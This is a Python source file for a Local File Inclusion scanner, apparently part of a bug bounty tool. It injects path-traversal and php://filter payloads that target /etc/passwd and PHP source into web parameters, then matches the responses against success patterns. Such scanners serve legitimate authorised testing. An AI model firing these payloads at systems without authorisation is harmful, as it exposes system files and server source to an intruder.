#!/usr/bin/env python3
"""
AI-BugBounty-Hunter — LFI/RFI Scanner
Detects Local File Inclusion and Remote File Inclusion vulnerabilities.
"""
import asyncio
import re
from typing import List, Dict
from urllib.parse import urlencode, urlparse, parse_qs, urlunparse
from scanners.base_scanner import BaseScanner
from core.config import Config


class LFIScanner(BaseScanner):
    """LFI/RFI vulnerability scanner."""

    VULN_TYPE = "Local File Inclusion (LFI)"
    DEFAULT_SEVERITY = "high"

    LFI_PAYLOADS = [
        "../../../etc/passwd",
        "../../../../etc/passwd",
        "../../../../../etc/passwd",
        "....//....//....//etc/passwd",
        "..%2F..%2F..%2Fetc%2Fpasswd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
        "php://filter/convert.base64-encode/resource=index.php",
        "php://filter/read=string.rot13/resource=index.php",
        "/etc/passwd%00",
        "../../../../../../etc/passwd%00",
    ]

    # Patterns that indicate successful LFI
    SUCCESS_PATTERNS = [
        r"root:x?:0:0:",         # /etc/passwd
        r"nobody:x?:\d+:\d+:",   # /etc/passwd
        r"\[boot loader\]",       # Windows boot.ini
        r"localhost\s+localhost", # /etc/hosts
        r"127\.0\.0\.1\s+localhost",
        r"<\?php",               # PHP source via php://filter
        r"[a-zA-Z0-9+/]{100,}={0,2}",  # base64 encoded content
    ]

    INTERESTING_PARAMS = {
        "file", "path", "page", "include", "load", "template",
        "view", "layout", "dir", "document", "folder", "root",
        "module", "theme", "lang", "language", "locale", "action",
        "f", "p", "pg", "doc",
    }

    async def scan(self, urls: List[str], parameters: List[Dict]) -> List[Dict]:
        """Scan for LFI vulnerabilities."""
        self.logger.info(f"LFI scan: {len(parameters)} parameters")
        findings: List[Dict] = []

        # Prioritize interesting parameter names
        interesting = [
            p for p in parameters
            if p.get("parameter", "").lower() in self.INTERESTING_PARAMS
        ] or parameters  # Fall back to all if none match

        tasks = [self._test_param(param, findings) for param in interesting]
        await asyncio.gather(*tasks, return_exceptions=True)
        self.logger.info(f"  LFI: {len(findings)} potential findings")
        return findings

    async def _test_param(self, param: Dict, findings: List[Dict]):
        """Test a parameter for LFI."""
        base_url = param.get("url", "")
        param_name = param.get("parameter", "")
        method = param.get("method", "GET")

        for payload in self.LFI_PAYLOADS:
            resp, body = await self._send(base_url, param_name, payload, method)
            if not body:
                continue

            for pattern in self.SUCCESS_PATTERNS:
                if re.search(pattern, body):
                    findings.append(self._make_finding(
                        url=base_url,
                        parameter=param_name,
                        payload=payload,
                        evidence=self._extract_match(pattern, body),
                        severity="high",
                        confidence=0.9,
                        extra={"method": method},
                    ))
                    return  # Found, stop testing this param

    def _extract_match(self, pattern: str, body: str) -> str:
        """Extract context around match."""
        match = re.search(pattern, body)
        if match:
            idx = match.start()
            return body[max(0, idx-20):min(len(body), idx+300)]
        return body[:500]

    async def _send(self, url: str, param_name: str, payload: str, method: str):
        if method == "POST":
            return await self._post(url, data={param_name: payload})
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        params[param_name] = [payload]
        new_query = urlencode({k: v[0] for k, v in params.items()})
        return await self._get(urlunparse(parsed._replace(query=new_query)))
